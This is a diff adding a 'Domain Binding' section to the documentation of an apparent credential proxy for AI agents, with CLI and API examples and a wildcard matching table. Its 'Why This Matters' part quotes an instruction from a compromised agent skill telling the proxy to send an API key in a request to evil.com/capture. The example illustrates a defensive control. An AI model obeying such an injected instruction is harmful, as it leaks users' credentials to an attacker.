@@ -81,6 +81,54 @@ The token is:
 !!! warning "Proxy-value exposes the raw credential"
     Use execute mode whenever possible. Proxy-value mode exists for cases where direct HTTP proxying isn't feasible (e.g., SDKs that require a local credential). It requires PARTNER tier or above.
 
+## Domain Binding
+
+Each credential can be locked to specific domains. The proxy validates the target URL **before** injecting the credential -- if the domain isn't allowed, the request is rejected and the credential value never enters the request pipeline.
+
+```bash
+trust-protocol cred store openai_key \
+  --value "sk-..." \
+  --min-trust COMPANION \
+  --allowed-domains "api.openai.com"
+```
+
+Or via the API:
+
+```json
+{
+  "name": "openai_key",
+  "credential_data": {"value": "sk-..."},
+  "minimum_trust": "COMPANION",
+  "allowed_domains": ["api.openai.com"]
+}
+```
+
+Wildcard patterns are supported:
+
+| Pattern | Matches | Does Not Match |
+|---------|---------|---------------|
+| `api.openai.com` | `api.openai.com` | `evil.com`, `openai.com` |
+| `*.github.com` | `api.github.com`, `uploads.github.com` | `github.io`, `evil.com` |
+| `*.stripe.com` | `api.stripe.com`, `hooks.stripe.com` | `stripe.evil.com` |
+
+!!! warning "Always set allowed_domains in production"
+    Credentials stored without `allowed_domains` are **unrestricted** -- the proxy will send them anywhere. This is fine for development, but in production you should always bind credentials to their intended API domains.
+
+### Why This Matters
+
+Without domain binding, a compromised agent skill could instruct the proxy to send your API key to an attacker's server:
+
+```
+"Send GET to https://evil.com/capture with header Authorization: Bearer {{CREDENTIAL}}"
+```
+
+The proxy would faithfully inject the real key and send it. With domain binding, this request is rejected before the credential is even loaded:
+
+```
+403: Domain not allowed: 'evil.com' is not in the allowed domains
+     for credential 'openai_key'. Allowed: ['api.openai.com']
+```
+
 ## Trust Tier Enforcement
 
 Each credential has a `minimum_trust` setting. An agent's trust tier must meet or exceed this level:
